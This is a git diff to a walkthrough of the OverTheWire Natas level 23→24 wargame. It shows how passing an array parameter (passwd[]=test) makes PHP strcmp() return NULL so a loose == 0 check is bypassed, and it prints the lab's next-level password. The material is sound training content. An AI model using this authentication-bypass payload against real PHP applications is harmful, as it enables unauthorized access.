@@ -1,4 +1,4 @@
-# Natas Level 23 → Level 24
+# Natas Level 23 → Level 24 bypassing PHP strcmp() 
 
 ## Previous Flag
 <b>MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd</b>
@@ -33,6 +33,7 @@ php > echo strcmp("cuddle", "a");
 php > echo strcmp("ca", "cb");
 -1
 
+Note: Most PHP function bypasses are well-known and covered on various blogs
 Google: bypassing PHP strcmp()
 https://blog.0daylabs.com/2015/09/21/csaw-web-200-write-up/?ref=learnhacking.io
 
@@ -40,7 +41,7 @@ $username = $_POST['username'];
 $password = $_POST['password'];
 $real_password = "original_password_here";
 
-if (strcmp($password, $real_password) == 0) { echo "flag{}"; }
+if (strcmp($password, $real_password) == 0) { echo "flag{}"; } 👀
 
 Capturing request w/ tamper data & replacing password=lol w/ password[]=lol to bypass authentication
     $password becomes an array
@@ -89,10 +90,18 @@ Password:
 </body>
 </html>
 
+Password: test
+Browser: http://natas24.natas.labs.overthewire.org/?passwd=test
+Browser: http://natas24.natas.labs.overthewire.org/?passwd[]=test       # Vulnerability
+
+Warning: strcmp() expects parameter 1 to be string, array given in /var/www/natas/natas24/index.php on line 23
+
+The credentials for the next level are:
+Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws 🔐
 ```
 
 ## Flag
-
+<b>ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws</b>
 
 ## Continue
 [Continue](/overthewire/Natas2425.md)
